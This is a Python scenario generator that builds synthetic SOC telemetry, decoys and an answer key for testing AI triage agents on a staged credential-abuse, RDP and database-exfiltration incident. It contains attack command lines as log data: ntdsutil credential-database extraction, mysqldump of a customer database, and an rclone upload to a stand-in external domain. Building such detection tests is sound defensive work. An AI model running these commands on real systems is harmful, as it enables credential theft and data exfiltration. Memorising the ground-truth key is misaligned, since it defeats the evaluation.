"""Adversarial scenario: credential abuse → lateral RDP → DB dump → cloud upload.

Designed for dynamic agent audits.  Titles and ``gpt_verdict_label`` avoid
obvious keywords (exfil / insider / lateral / compromise) so triage must
correlate multi-source telemetry instead of matching canned demo labels.

Ground truth (for auditors — not exposed to agents):
  - Stolen service account ``svc-analytics-47`` authenticates over VPN from
    unusual geo (198.51.100.44, RFC5737).
  - Credential tooling on ``WKS-DATA-031``, RDP pivot to ``SRV-DB-STG-02``.
  - ``mysqldump`` + ``rclone.exe`` staging ~890MB to ``storage-sync-cdn.example``.
"""

from __future__ import annotations

from datetime import UTC, datetime
from typing import Any

from app.data_generators.noise import NoiseGenerator
from app.data_generators.scenarios._common import (
    SCENARIO_VARIANTS,
    disposition_connector,
    event,
    failure_profile_for_variant,
    log_only_connector,
    make_ref,
    normalize_variant,
    telemetry_for_variant,
)
from app.mock_xdr.models import MockXDRScenario, ScenarioVariant
from app.models.enums import SourceObjectKind
from app.models.source import SourceAlert, SourceAsset, SourceIncident, SourceLog

SCENARIO_ID = "adversarial_credential_db_staging_exfil"
ADVERSARIAL_TENANT = "tenant-adversarial-audit"
ADVERSARIAL_BASE_TIME = datetime(2025, 11, 18, 2, 15, 0, tzinfo=UTC)

# Entities — generic service naming, not demo personas.
ACCOUNT = "svc-analytics-47"
HOST_WORKSTATION = "WKS-DATA-031"
HOST_DB = "SRV-DB-STG-02"
HOST_BACKUP_NOISE = "BACKUP-SRV-01"
VPN_SRC_IP = "198.51.100.44"  # RFC5737 TEST-NET-2
INTERNAL_WKS_IP = "10.44.12.31"
INTERNAL_DB_IP = "10.44.20.88"
STAGING_SHARE = "\\\\fileshare\\staging\\export-20251118-0215.sql"
UPLOAD_DOMAIN = "storage-sync-cdn.example"  # RFC2606
UPLOAD_IP = "198.51.100.77"
PROC_NTDS = "ntdsutil.exe"
PROC_MYSQL = "mysqldump.exe"
PROC_RCLONE = "rclone.exe"
DUMP_FILE = "export-20251118-0215.sql"

INCIDENT_ID = "88190001"
ALERT_NET_ID = "adv-net-vol-88190001"
ALERT_IDENTITY_ID = "adv-id-88190002"
ALERT_ENDPOINT_ID = "adv-ep-88190003"
ALERT_DLP_ID = "adv-dlp-88190004"
ASSET_WKS_ID = "310031"
ASSET_DB_ID = "310002"
ASSET_BACKUP_ID = "319999"
LOG_NET_ID = "adv-log-net-001"
LOG_IDENTITY_ID = "adv-log-id-002"
LOG_ENDPOINT_ID = "adv-log-ep-003"
LOG_DLP_ID = "adv-log-dlp-004"

# High-noise profile (closer to messy SOC feeds — still deterministic under ``seed``).
NETWORK_NOISE_COUNT = 280
IDENTITY_NOISE_COUNT = 90
ENDPOINT_NOISE_COUNT = 140
DNS_NOISE_COUNT = 60
DECOY_INCIDENT_COUNT = 5
ALERT_STORM_DUPLICATES = 10

GROUND_TRUTH: dict[str, Any] = {
    "scenario_id": SCENARIO_ID,
    "attack_narrative": (
        "VPN login with service account from unusual geo → credential tooling on "
        "analytics workstation → RDP lateral movement to DB staging server → "
        "mysqldump → rclone HTTPS upload to external object-storage domain."
    ),
    "acceptable_event_types": [
        "data_exfiltration",
        "lateral_movement",
        "account_anomaly",
        "insider_threat",
        "host_compromise",
    ],
    "minimum_risk_score": 65,
    "expected_verdict": "confirmed_threat",
    "minimum_severity": "medium",
    "must_identify_entities": [
        ACCOUNT,
        HOST_WORKSTATION,
        HOST_DB,
    ],
    "must_identify_indicators": [
        VPN_SRC_IP,
        UPLOAD_DOMAIN,
    ],
    "must_response_targets": [
        ACCOUNT,
        HOST_WORKSTATION,
        HOST_DB,
        VPN_SRC_IP,
    ],
    "key_processes": [PROC_NTDS, PROC_MYSQL, PROC_RCLONE],
    "egress_bytes_min": 500_000_000,
    "true_positive_incident_id": INCIDENT_ID,
    "noise_profile": {
        "network_noise_rows": NETWORK_NOISE_COUNT,
        "identity_noise_rows": IDENTITY_NOISE_COUNT,
        "endpoint_noise_rows": ENDPOINT_NOISE_COUNT,
        "dns_noise_rows": DNS_NOISE_COUNT,
        "decoy_incidents": DECOY_INCIDENT_COUNT,
        "alert_storm_duplicates": ALERT_STORM_DUPLICATES,
    },
}


def build_adversarial_credential_db_staging_exfil(
    *,
    seed: int = 9918,
    variant: ScenarioVariant | str = ScenarioVariant.NORMAL,
) -> MockXDRScenario:
    """Build the adversarial audit scenario (deterministic under ``seed``)."""
    selected_variant = normalize_variant(variant)
    base = ADVERSARIAL_BASE_TIME
    tenant = ADVERSARIAL_TENANT
    conn_log = log_only_connector(connector_id="conn-adv-log")
    conn_disp = disposition_connector(connector_id="conn-adv-disp")

    asset_wks_ref = make_ref(
        SourceObjectKind.ASSET,
        ASSET_WKS_ID,
        tenant=tenant,
        connector_id=conn_disp.connector_id,
        status_raw="managed",
        updated_at=base,
        object_type="endpoint",
    )
    asset_db_ref = make_ref(
        SourceObjectKind.ASSET,
        ASSET_DB_ID,
        tenant=tenant,
        connector_id=conn_disp.connector_id,
        status_raw="managed",
        updated_at=base,
        object_type="server",
    )
    asset_backup_ref = make_ref(
        SourceObjectKind.ASSET,
        ASSET_BACKUP_ID,
        tenant=tenant,
        connector_id=conn_disp.connector_id,
        status_raw="managed",
        updated_at=base,
        object_type="server",
    )

    assets = [
        SourceAsset(
            reference=asset_wks_ref,
            numeric_asset_id=ASSET_WKS_ID,
            hostname=HOST_WORKSTATION,
            ip=INTERNAL_WKS_IP,
            asset_name=HOST_WORKSTATION,
            asset_group="analytics",
            owner="data-platform-team",
            business_system="analytics_pipeline",
            importance="high",
            agent_status="online",
            first_seen_at=base,
            last_seen_at=base,
            normalized={"role": "workstation"},
        ),
        SourceAsset(
            reference=asset_db_ref,
            numeric_asset_id=ASSET_DB_ID,
            hostname=HOST_DB,
            ip=INTERNAL_DB_IP,
            asset_name=HOST_DB,
            asset_group="database",
            owner="dba-team",
            business_system="customer_staging_db",
            importance="critical",
            agent_status="online",
            first_seen_at=base,
            last_seen_at=base,
            normalized={"role": "db_staging"},
        ),
        SourceAsset(
            reference=asset_backup_ref,
            numeric_asset_id=ASSET_BACKUP_ID,
            hostname=HOST_BACKUP_NOISE,
            ip="10.44.99.10",
            asset_name=HOST_BACKUP_NOISE,
            asset_group="infrastructure",
            importance="medium",
            agent_status="online",
            normalized={"role": "backup_noise"},
        ),
    ]

    log_net_ref = make_ref(
        SourceObjectKind.LOG,
        LOG_NET_ID,
        tenant=tenant,
        connector_id=conn_log.connector_id,
        parent=ALERT_NET_ID,
        status_raw="indexed",
        updated_at=base,
    )
    log_identity_ref = make_ref(
        SourceObjectKind.LOG,
        LOG_IDENTITY_ID,
        tenant=tenant,
        connector_id=conn_log.connector_id,
        parent=ALERT_IDENTITY_ID,
        status_raw="indexed",
        updated_at=base,
    )
    log_endpoint_ref = make_ref(
        SourceObjectKind.LOG,
        LOG_ENDPOINT_ID,
        tenant=tenant,
        connector_id=conn_disp.connector_id,
        parent=ALERT_ENDPOINT_ID,
        status_raw="indexed",
        updated_at=base,
    )
    log_dlp_ref = make_ref(
        SourceObjectKind.LOG,
        LOG_DLP_ID,
        tenant=tenant,
        connector_id=conn_disp.connector_id,
        parent=ALERT_DLP_ID,
        status_raw="indexed",
        updated_at=base,
    )

    logs = [
        SourceLog(
            reference=log_net_ref,
            device_source="nfw",
            category="egress_volume",
            logged_at=base,
            src_ip=INTERNAL_DB_IP,
            dst_ip=UPLOAD_IP,
            dst_port=443,
            raw_payload={
                "bytes_out": 934_281_600,
                "domain": UPLOAD_DOMAIN,
                "hostname": HOST_DB,
            },
        ),
        SourceLog(
            reference=log_identity_ref,
            device_source="iam",
            category="authentication",
            logged_at=base,
            src_ip=VPN_SRC_IP,
            raw_payload={
                "account": ACCOUNT,
                "auth_method": "vpn_mfa",
                "geo": "unknown_region",
            },
        ),
        SourceLog(
            reference=log_endpoint_ref,
            device_source="edr",
            category="process_chain",
            logged_at=base,
            src_ip=INTERNAL_WKS_IP,
            raw_payload={
                "hostname": HOST_WORKSTATION,
                "processes": [PROC_NTDS, PROC_RCLONE],
                "account": ACCOUNT,
            },
        ),
        SourceLog(
            reference=log_dlp_ref,
            device_source="dlp",
            category="schema_export",
            logged_at=base,
            src_ip=INTERNAL_DB_IP,
            raw_payload={
                "file": DUMP_FILE,
                "hostname": HOST_DB,
                "account": ACCOUNT,
                "sensitivity": "pii_schema",
            },
        ),
    ]

    incident_ref = make_ref(
        SourceObjectKind.INCIDENT,
        INCIDENT_ID,
        tenant=tenant,
        connector_id=conn_disp.connector_id,
        status_raw="open",
        updated_at=base,
        object_type="correlation_incident",
    )
    alert_net_ref = make_ref(
        SourceObjectKind.ALERT,
        ALERT_NET_ID,
        tenant=tenant,
        connector_id=conn_disp.connector_id,
        status_raw="open",
        updated_at=base,
        object_type="network_anomaly",
    )
    alert_identity_ref = make_ref(
        SourceObjectKind.ALERT,
        ALERT_IDENTITY_ID,
        tenant=tenant,
        connector_id=conn_disp.connector_id,
        status_raw="open",
        updated_at=base,
        object_type="identity_anomaly",
    )
    alert_endpoint_ref = make_ref(
        SourceObjectKind.ALERT,
        ALERT_ENDPOINT_ID,
        tenant=tenant,
        connector_id=conn_disp.connector_id,
        status_raw="open",
        updated_at=base,
        object_type="endpoint_anomaly",
    )
    alert_dlp_ref = make_ref(
        SourceObjectKind.ALERT,
        ALERT_DLP_ID,
        tenant=tenant,
        connector_id=conn_disp.connector_id,
        status_raw="open",
        updated_at=base,
        object_type="dlp_policy",
    )

    alerts = [
        SourceAlert(
            reference=alert_net_ref,
            incident_ref=incident_ref,
            source_ip=INTERNAL_DB_IP,
            related_log_refs=[log_net_ref],
            normalized={
                "level": "medium",
                "gpt_tag": "volume_anomaly_review",
                "metric": "bytes_out_15m",
                "threshold_ratio": 4.2,
            },
            raw_payload={"rule": "egress_volume_spike_db_segment"},
        ),
        SourceAlert(
            reference=alert_identity_ref,
            incident_ref=incident_ref,
            source_ip=VPN_SRC_IP,
            related_log_refs=[log_identity_ref],
            normalized={
                "level": "medium",
                "gpt_tag": "session_geo_delta",
                "account": ACCOUNT,
            },
            raw_payload={"rule": "vpn_session_velocity"},
        ),
        SourceAlert(
            reference=alert_endpoint_ref,
            incident_ref=incident_ref,
            source_ip=INTERNAL_WKS_IP,
            related_log_refs=[log_endpoint_ref],
            normalized={
                "level": "high",
                "gpt_tag": "toolchain_review",
                "hostname": HOST_WORKSTATION,
            },
            raw_payload={"rule": "privileged_utility_sequence"},
        ),
        SourceAlert(
            reference=alert_dlp_ref,
            incident_ref=incident_ref,
            source_ip=INTERNAL_DB_IP,
            related_log_refs=[log_dlp_ref],
            normalized={
                "level": "high",
                "gpt_tag": "schema_export_review",
                "file": DUMP_FILE,
            },
            raw_payload={"rule": "database_schema_export"},
        ),
    ]

    incident = SourceIncident(
        reference=incident_ref,
        title="Correlation: elevated session and volume signals on analytics segment",
        level="high",
        gpt_verdict_label="multi_signal_correlation_pending",
        related_alert_refs=[
            alert_net_ref,
            alert_identity_ref,
            alert_endpoint_ref,
            alert_dlp_ref,
        ],
        impacted_asset_refs=[asset_wks_ref, asset_db_ref],
        normalized={
            "account": ACCOUNT,
            "hostname": HOST_WORKSTATION,
            "secondary_host": HOST_DB,
            "src_ip": VPN_SRC_IP,
            "internal_ip": INTERNAL_WKS_IP,
            "scenario": SCENARIO_ID,
            "description": (
                "Correlated medium alerts across identity, endpoint, network volume, "
                "and schema-export monitors during early-morning maintenance window."
            ),
            # Deliberately no event_type / alert_type — ingestion should land on OTHER.
            "risk_hint": 72,
        },
    )

    timeline = telemetry_for_variant(
        _append_high_noise_layers(
            _build_timeline(base=base, seed=seed),
            base=base,
            seed=seed,
        ),
        variant=selected_variant,
    )

    decoy_incidents, decoy_alerts, decoy_assets, decoy_logs = _build_decoy_objects(
        base=base,
        tenant=tenant,
        conn_log=conn_log,
        conn_disp=conn_disp,
        seed=seed,
    )

    return MockXDRScenario(
        scenario_id=SCENARIO_ID,
        name=f"Adversarial credential→DB staging→cloud upload [{selected_variant.value}]",
        variant=selected_variant,
        base_time=base,
        source_tenant_id=tenant,
        incidents=[*decoy_incidents, incident],
        alerts=[*decoy_alerts, *alerts],
        assets=[*decoy_assets, *assets],
        logs=[*decoy_logs, *logs],
        connectors=[conn_log, conn_disp],
        telemetry_timeline=timeline,
        ticks=[],
        failure_profile=failure_profile_for_variant(seed=seed, variant=selected_variant),
        expected_outcome={
            **GROUND_TRUTH,
            "decoy_incident_ids": [d.reference.source_object_id for d in decoy_incidents],
            "telemetry_row_count": len(timeline),
            "key_event_count": sum(1 for row in timeline if row.get("is_key_event")),
            "noise_row_count": sum(1 for row in timeline if row.get("is_noise")),
            "active_variant": selected_variant.value,
            "variants": list(SCENARIO_VARIANTS),
        },
    )


def _build_decoy_objects(
    *,
    base: datetime,
    tenant: str,
    conn_log: Any,
    conn_disp: Any,
    seed: int,
) -> tuple[list[SourceIncident], list[SourceAlert], list[SourceAsset], list[SourceLog]]:
    """Benign/misleading incidents that pollute the ingestion queue."""
    decoy_specs = [
        {
            "incident_id": "88190101",
            "title": "Routine: patch baseline drift on endpoint fleet segment B",
            "hostname": "WKS-PATCH-014",
            "account": "patch-orchestrator",
            "alert_rule": "baseline_drift_low",
        },
        {
            "incident_id": "88190102",
            "title": "Marketing crawl triggered edge rate pattern (expected)",
            "hostname": "EDGE-WAF-02",
            "account": "web-monitor",
            "alert_rule": "waf_rate_expected",
        },
        {
            "incident_id": "88190103",
            "title": "Dev registry pull burst during container rebuild window",
            "hostname": "DEV-REG-CLIENT-09",
            "account": "ci-runner-09",
            "alert_rule": "registry_pull_burst",
        },
        {
            "incident_id": "88190104",
            "title": "Printer/scanner SMB burst — facility maintenance window",
            "hostname": "PRINT-SCAN-007",
            "account": "facility-iot",
            "alert_rule": "smb_burst_facility",
        },
        {
            "incident_id": "88190105",
            "title": "Repeated low-disk advisory across non-production hosts",
            "hostname": "LAB-HOST-STORM",
            "account": "lab-automation",
            "alert_rule": "disk_threshold_low",
            "alert_storm": True,
        },
    ]

    incidents: list[SourceIncident] = []
    alerts: list[SourceAlert] = []
    assets: list[SourceAsset] = []
    logs: list[SourceLog] = []

    for spec in decoy_specs[:DECOY_INCIDENT_COUNT]:
        incident_id = str(spec["incident_id"])
        hostname = str(spec["hostname"])
        account = str(spec["account"])
        asset_id = f"decoy-asset-{incident_id}"
        asset_ref = make_ref(
            SourceObjectKind.ASSET,
            asset_id,
            tenant=tenant,
            connector_id=conn_disp.connector_id,
            status_raw="managed",
            updated_at=base,
            object_type="endpoint",
        )
        assets.append(
            SourceAsset(
                reference=asset_ref,
                numeric_asset_id=asset_id,
                hostname=hostname,
                ip=f"10.44.90.{int(incident_id[-2:])}",
                asset_name=hostname,
                importance="low",
                agent_status="online",
                normalized={"decoy": True},
            )
        )

        incident_ref = make_ref(
            SourceObjectKind.INCIDENT,
            incident_id,
            tenant=tenant,
            connector_id=conn_disp.connector_id,
            status_raw="open",
            updated_at=base,
            object_type="maintenance_incident",
        )
        related_alert_refs = []
        storm_count = ALERT_STORM_DUPLICATES if spec.get("alert_storm") else 1
        for idx in range(storm_count):
            alert_id = f"adv-decoy-{incident_id}-alert-{idx + 1:02d}"
            log_id = f"adv-decoy-{incident_id}-log-{idx + 1:02d}"
            alert_ref = make_ref(
                SourceObjectKind.ALERT,
                alert_id,
                tenant=tenant,
                connector_id=conn_disp.connector_id,
                status_raw="open",
                updated_at=base,
                object_type="maintenance_alert",
            )
            log_ref = make_ref(
                SourceObjectKind.LOG,
                log_id,
                tenant=tenant,
                connector_id=conn_log.connector_id,
                parent=alert_id,
                status_raw="indexed",
                updated_at=base,
            )
            alerts.append(
                SourceAlert(
                    reference=alert_ref,
                    incident_ref=incident_ref,
                    source_ip=f"10.44.90.{int(incident_id[-2:])}",
                    related_log_refs=[log_ref],
                    normalized={
                        "level": "low",
                        "gpt_tag": "scheduled_maintenance_review",
                        "hostname": hostname,
                        "account": account,
                        "rule": spec["alert_rule"],
                        "storm_index": idx,
                    },
                    raw_payload={"decoy": True, "rule": spec["alert_rule"]},
                )
            )
            logs.append(
                SourceLog(
                    reference=log_ref,
                    device_source="syslog",
                    category="maintenance",
                    logged_at=base,
                    src_ip=f"10.44.90.{int(incident_id[-2:])}",
                    raw_payload={"account": account, "hostname": hostname, "decoy": True},
                )
            )
            related_alert_refs.append(alert_ref)

        incidents.append(
            SourceIncident(
                reference=incident_ref,
                title=str(spec["title"]),
                level="low",
                gpt_verdict_label="scheduled_maintenance_review",
                related_alert_refs=related_alert_refs,
                impacted_asset_refs=[asset_ref],
                normalized={
                    "hostname": hostname,
                    "account": account,
                    "decoy": True,
                    "description": "Expected operational activity during maintenance window.",
                },
            )
        )

    return incidents, alerts, assets, logs


def _append_high_noise_layers(
    timeline: list[dict[str, Any]],
    *,
    base: datetime,
    seed: int,
) -> list[dict[str, Any]]:
    """Merge deterministic background noise into all major telemetry channels."""
    rows = list(timeline)

    network_noise = NoiseGenerator(seed=seed + 11, base_time=base, channel="network")
    for row in network_noise.generate(count=NETWORK_NOISE_COUNT):
        row["channel"] = "network"
        row["is_noise"] = True
        row["is_key_event"] = False
        rows.append(row)

    identity_noise = NoiseGenerator(seed=seed + 23, base_time=base, channel="identity")
    for idx, row in enumerate(identity_noise.generate(count=IDENTITY_NOISE_COUNT)):
        row["channel"] = "identity"
        row["event_type"] = "login"
        row["result"] = "success"
        row["account"] = f"noise-user-{(seed + idx) % 200:03d}"
        row["is_noise"] = True
        row["is_key_event"] = False
        rows.append(row)

    endpoint_noise = NoiseGenerator(seed=seed + 37, base_time=base, channel="endpoint")
    for idx, row in enumerate(endpoint_noise.generate(count=ENDPOINT_NOISE_COUNT)):
        row["channel"] = "endpoint"
        row["hostname"] = f"WKS-NOISE-{(seed + idx) % 400:04d}"
        row["process"] = "svchost.exe"
        row["action"] = "process_create"
        row["is_noise"] = True
        row["is_key_event"] = False
        rows.append(row)

    dns_noise = NoiseGenerator(seed=seed + 41, base_time=base, channel="dns")
    for idx, row in enumerate(dns_noise.generate(count=DNS_NOISE_COUNT)):
        row["channel"] = "dns"
        row["query"] = f"cdn-static-{idx % 100:02d}.example.com"
        row["is_noise"] = True
        row["is_key_event"] = False
        rows.append(row)

    # Suspicious-looking but benign key events (compete with true signal in retrieval).
    for idx in range(6):
        rows.append(
            event(
                channel="network",
                record_id=f"adv-decoy-net-{seed}-{idx:03d}",
                offset_s=900 + idx * 15,
                base_time=base,
                src_ip=f"10.44.90.{20 + idx}",
                dst_ip="198.51.100.10",
                dst_port=443,
                bytes_out=150_000 + idx * 10_000,
                hostname=f"WKS-PATCH-{idx:03d}",
                is_key_event=True,
                is_noise=False,
                decoy_signal=True,
            )
        )

    return rows


def _build_timeline(*, base: datetime, seed: int) -> list[dict[str, Any]]:
    """≥22 key events with red herrings across all seven channels."""
    rows: list[dict[str, Any]] = []

    # --- red herring: legitimate backup noise ---
    rows.append(
        event(
            channel="identity",
            record_id=f"adv-noise-id-{seed}-001",
            offset_s=0,
            base_time=base,
            account="ops-scheduler",
            event_type="login",
            src_ip="10.44.1.5",
            result="success",
            is_key_event=True,
        )
    )
    rows.append(
        event(
            channel="endpoint",
            record_id=f"adv-noise-ep-{seed}-002",
            offset_s=30,
            base_time=base,
            hostname=HOST_BACKUP_NOISE,
            process="veeam.exe",
            account="backup-agent",
            action="process_create",
            is_key_event=True,
        )
    )

    # --- stage 1: VPN session from unusual geo ---
    rows.append(
        event(
            channel="identity",
            record_id=f"adv-key-id-{seed}-003",
            offset_s=60,
            base_time=base,
            account=ACCOUNT,
            event_type="vpn_login",
            src_ip=VPN_SRC_IP,
            result="success",
            geo="region_delta_high",
            mfa_device_new=True,
            is_key_event=True,
            is_conflict_seed=True,
        )
    )
    rows.append(
        event(
            channel="identity",
            record_id=f"adv-key-id-{seed}-004",
            offset_s=120,
            base_time=base,
            account=ACCOUNT,
            event_type="session_token_issue",
            src_ip=VPN_SRC_IP,
            result="success",
            is_key_event=True,
        )
    )

    # --- stage 2: credential tooling on workstation ---
    rows.append(
        event(
            channel="endpoint",
            record_id=f"adv-key-ep-{seed}-005",
            offset_s=180,
            base_time=base,
            hostname=HOST_WORKSTATION,
            process=PROC_NTDS,
            account=ACCOUNT,
            action="process_create",
            cmdline=f"{PROC_NTDS} ifm create full {STAGING_SHARE}",
            is_key_event=True,
            is_conflict_seed=True,
        )
    )
    rows.append(
        event(
            channel="endpoint",
            record_id=f"adv-key-ep-{seed}-006",
            offset_s=240,
            base_time=base,
            hostname=HOST_WORKSTATION,
            process="mstsc.exe",
            account=ACCOUNT,
            action="process_create",
            cmdline=f"mstsc.exe /v:{HOST_DB}",
            is_key_event=True,
        )
    )

    # --- stage 3: lateral RDP + DB dump on staging server ---
    rows.append(
        event(
            channel="endpoint",
            record_id=f"adv-key-ep-{seed}-007",
            offset_s=300,
            base_time=base,
            hostname=HOST_DB,
            process=PROC_MYSQL,
            account=ACCOUNT,
            action="process_create",
            cmdline=(
                f"{PROC_MYSQL} --host=127.0.0.1 --user=readonly --result-file={STAGING_SHARE}"
            ),
            is_key_event=True,
        )
    )
    rows.append(
        event(
            channel="endpoint",
            record_id=f"adv-key-ep-{seed}-008",
            offset_s=360,
            base_time=base,
            hostname=HOST_DB,
            process=PROC_RCLONE,
            account=ACCOUNT,
            action="process_create",
            cmdline=f"{PROC_RCLONE} copy {STAGING_SHARE} remote:bucket/sync",
            is_key_event=True,
        )
    )

    # --- DLP + DNS + network egress ---
    rows.append(
        event(
            channel="dlp",
            record_id=f"adv-key-dlp-{seed}-009",
            offset_s=390,
            base_time=base,
            file_name=DUMP_FILE,
            action="archive",
            bytes=891_289_600,
            account=ACCOUNT,
            hostname=HOST_DB,
            is_key_event=True,
        )
    )
    rows.append(
        event(
            channel="dlp",
            record_id=f"adv-key-dlp-{seed}-010",
            offset_s=420,
            base_time=base,
            file_name=DUMP_FILE,
            action="upload",
            bytes=891_289_600,
            account=ACCOUNT,
            hostname=HOST_DB,
            destination=UPLOAD_DOMAIN,
            is_key_event=True,
        )
    )
    rows.append(
        event(
            channel="dns",
            record_id=f"adv-key-dns-{seed}-011",
            offset_s=430,
            base_time=base,
            query=UPLOAD_DOMAIN,
            qtype="A",
            rcode="NOERROR",
            answer=UPLOAD_IP,
            hostname=HOST_DB,
            is_key_event=True,
        )
    )
    rows.append(
        event(
            channel="network",
            record_id=f"adv-key-net-{seed}-012",
            offset_s=450,
            base_time=base,
            src_ip=INTERNAL_DB_IP,
            dst_ip=UPLOAD_IP,
            dst_port=443,
            bytes_out=934_281_600,
            hostname=HOST_DB,
            domain=UPLOAD_DOMAIN,
            is_key_event=True,
        )
    )
    rows.append(
        event(
            channel="network",
            record_id=f"adv-key-net-{seed}-013",
            offset_s=480,
            base_time=base,
            src_ip=INTERNAL_WKS_IP,
            dst_ip=INTERNAL_DB_IP,
            dst_port=3389,
            protocol="rdp",
            hostname=HOST_WORKSTATION,
            is_key_event=True,
        )
    )

    # --- threat intel on upload infra ---
    rows.append(
        event(
            channel="threat_intel",
            record_id=f"adv-key-ti-{seed}-014",
            offset_s=500,
            base_time=base,
            indicator=UPLOAD_IP,
            indicator_type="ip",
            confidence=0.86,
            tags=["object_storage", "recently_observed"],
            is_key_event=True,
        )
    )
    rows.append(
        event(
            channel="threat_intel",
            record_id=f"adv-key-ti-{seed}-015",
            offset_s=510,
            base_time=base,
            indicator=UPLOAD_DOMAIN,
            indicator_type="domain",
            confidence=0.84,
            tags=["sync_client_target"],
            is_key_event=True,
        )
    )

    # --- asset context ---
    rows.append(
        event(
            channel="asset",
            record_id=f"adv-key-asset-{seed}-016",
            offset_s=0,
            base_time=base,
            numeric_asset_id=ASSET_WKS_ID,
            hostname=HOST_WORKSTATION,
            ip=INTERNAL_WKS_IP,
            owner="data-platform-team",
            importance="high",
            is_key_event=True,
        )
    )
    rows.append(
        event(
            channel="asset",
            record_id=f"adv-key-asset-{seed}-017",
            offset_s=0,
            base_time=base,
            numeric_asset_id=ASSET_DB_ID,
            hostname=HOST_DB,
            ip=INTERNAL_DB_IP,
            owner="dba-team",
            importance="critical",
            business_system="customer_staging_db",
            is_key_event=True,
        )
    )

    # --- filler rows (non-key) for realism ---
    for idx, offset in enumerate(range(540, 900, 60), start=18):
        rows.append(
            event(
                channel="network",
                record_id=f"adv-fill-net-{seed}-{idx:03d}",
                offset_s=offset,
                base_time=base,
                src_ip="10.44.1.5",
                dst_ip="10.44.1.6",
                dst_port=443,
                bytes_out=12_000,
                is_key_event=False,
            )
        )

    return rows
